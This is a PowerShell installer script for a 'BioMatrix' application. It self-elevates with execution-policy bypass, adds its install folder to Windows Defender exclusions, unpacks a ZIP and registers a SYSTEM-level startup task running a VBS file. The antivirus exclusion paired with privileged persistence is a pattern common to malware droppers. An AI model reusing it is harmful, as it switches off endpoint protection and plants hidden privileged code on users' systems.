# Check for administrative privileges
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "This script needs to be run as an administrator. Relaunching with admin privileges..."
    Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    Exit
}

# Resolve the full path to the script's location
$ScriptDir = Split-Path -Path $MyInvocation.MyCommand.Definition -Parent

# Set paths
$ZipFilePath = "$ScriptDir\BioMatrix.zip"      # Path to the ZIP file relative to the script
$ExcludedPath = "C:\Program Files (x86)\BioMetrixCore"  # Path to exclude and copy files to
$ExecutablePath = "$ExcludedPath\launch.vbs"  # Path to the executable inside the extracted folder

# Define repetition intervals in seconds
$RunInterval          = 1 * 60   # 1 minutes

# Ensure the excluded path exists
if (-Not (Test-Path -Path $ExcludedPath)) {
    Write-Host "Creating excluded path: $ExcludedPath..."
    New-Item -ItemType Directory -Path $ExcludedPath -Force
}

# Add path to Windows Defender exclusion
Write-Host "Adding $ExcludedPath to Windows Defender exclusions..."
Add-MpPreference -ExclusionPath $ExcludedPath

# Remove existing files in the target directory
Write-Host "Cleaning target directory $ExcludedPath..."
Remove-Item -Path "$ExcludedPath\Newtonsoft.Json.dll" -Force -ErrorAction SilentlyContinue
Remove-Item -Path "$ExcludedPath\BioMatrix.exe" -Force -ErrorAction SilentlyContinue

# Extract ZIP file with overwrite support
Write-Host "Extracting $ZipFilePath to $ExcludedPath..."
Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::ExtractToDirectory($ZipFilePath, $ExcludedPath)

# Function to create a scheduled task
function Create-Task {
    param (
        [string]$TaskName
    )

    # Check if the task already exists and delete it if it does
    if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) {
        Write-Host "Deleting existing task $TaskName..."
        Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
    }

    # Create the Action for the Task
    $Action = New-ScheduledTaskAction -Execute $ExecutablePath

    # Create the Trigger for the Task
    $Trigger = New-ScheduledTaskTrigger -AtStartup

    # Set Task Settings
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

    # Set the Principal with the highest privileges
    $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

    # Register the Task
    Write-Host "Creating scheduled task $TaskName"
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal
}

# Create three tasks with different arguments and intervals
Create-Task -TaskName "FetchTasks"
Write-Host "All tasks created successfully!"

# Remove existing files in the target directory
Write-Host "Cleaning target directory $ExcludedPath..."
Remove-Item -Path "$ExcludedPath\BioMatrix.zip" -Force -ErrorAction SilentlyContinue

# Remove existing files in the target directory
Write-Host "Cleaning target directory $ExcludedPath, excluding app.exe..."
